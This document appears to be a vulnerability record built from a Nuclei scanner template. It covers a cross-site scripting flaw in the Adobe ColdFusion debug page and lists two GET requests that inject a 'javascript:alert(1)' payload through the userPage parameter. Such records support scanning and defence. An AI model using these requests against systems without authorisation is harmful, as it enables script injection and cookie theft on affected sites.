# Nuclei Template: Adobe ColdFusion - Cross-Site Scripting
**Template ID:** coldfusion-debug-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`coldfusion-debug-xss.yaml`)

## Vulnerability Information & PoC

## Description
Adobe ColdFusion debug page contains a cross-site scripting vulnerability when the application is running on a remote host. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
GET {{BaseURL}}/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
```

## References
- https://github.com/jaeles-project/jaeles-signatures/blob/master/common/coldfusion-debug-xss.yaml
